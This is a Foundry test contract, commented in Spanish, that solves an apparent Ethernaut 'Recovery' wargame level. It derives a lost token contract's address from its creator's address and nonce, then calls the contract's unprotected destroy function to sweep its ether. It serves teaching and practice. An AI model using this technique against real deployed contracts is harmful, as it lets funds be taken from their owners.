// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Recovery, SimpleToken} from "../../src/17_Recovery/Recovery.sol";

interface RecoveryInterface {
    function destroy(address payable _to) external;
}

contract Attack is Test {

    address public owner;
    Recovery public RecoveryVictim;
    SimpleToken public SimpleTokenVictim;

    function setUp() public {

        owner = vm.addr(1);

        vm.startPrank(owner);
        RecoveryVictim = new Recovery();
        console.log("RecoveryVictim: ", address(RecoveryVictim));

        // Send ETH to the contract
        vm.deal(0x4F9DA333DCf4E5A53772791B95c161B2FC041859, 1 ether );

        vm.stopPrank();

    }


    function test_generateToken() public {

        console.log("owner: ", owner);

        vm.startPrank(owner);
        RecoveryVictim.generateToken("SimpleToken", 1000);

        // Calcular el address del contrato SimpleToken
        // La dirección de la nueva cuenta se define como los 160 bits más a la
        // derecha del hash Keccak-256 de la codificación RLP de la estructura
        // que contiene solo el remitente y el nonce de la cuenta
        // (es decir, Keccak256(RLP([sender, nonce]))).
        // https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp
        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761

        /*
        En nuestro caso:

        El emisor es el propio contrato (la fábrica de contratos)Recover
        El nonce es el número de contrato que el propio contrato ha creado.
        Una cosa importante para recordar: ¡el nonce del contrato comienza desde 1 y
        no desde 0! Obtenga más información sobre el valor predeterminado de nonce en
        el documento de especificación EIP-161.
         */

         //RPL encoding for a address and a nonce
         // RPL (sender address, nonce)
         // 0xd6 , 0x94 , address(RecoveryVictim), 0x01



        address lostcontract = address(
            uint160(
                uint256(
                    keccak256(abi.encodePacked(
                        bytes1(0xd6),
                        bytes1(0x94),
                        address(RecoveryVictim), bytes1(0x01))))));

        /*
        La función detroy del contrato SimpleToken es la que se encarga de destruir el contrato
        y enviar los fondos a la dirección que se le pase como parámetro.
         */

        RecoveryInterface simpleToken = RecoveryInterface(address(lostcontract));
        console.log("token: ", lostcontract);

        simpleToken.destroy(payable(owner));

        assertEq(address(owner).balance, 1 ether);
        assertEq(address(lostcontract).balance, 0);

        vm.stopPrank();
    }


}